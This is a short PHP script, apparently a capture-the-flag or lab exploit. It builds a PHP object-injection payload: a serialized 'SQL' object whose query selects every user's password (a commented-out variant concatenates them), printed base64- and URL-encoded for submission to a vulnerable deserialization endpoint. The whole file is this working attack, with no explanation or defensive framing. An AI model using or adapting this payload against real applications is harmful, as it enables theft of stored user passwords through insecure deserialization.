<?php

class SQL {
    public $query;
    public $conn;
    public function __construct() {
        //$this->query = "SELECT GROUP_CONCAT(password) as username from users;";
        $this->query = "SELECT password as username from users;";
        //$this->conn = NULL;
    }
}

$jorge_si_fuese_una_db = new SQL();

echo urlencode(base64_encode(serialize($jorge_si_fuese_una_db)))
?>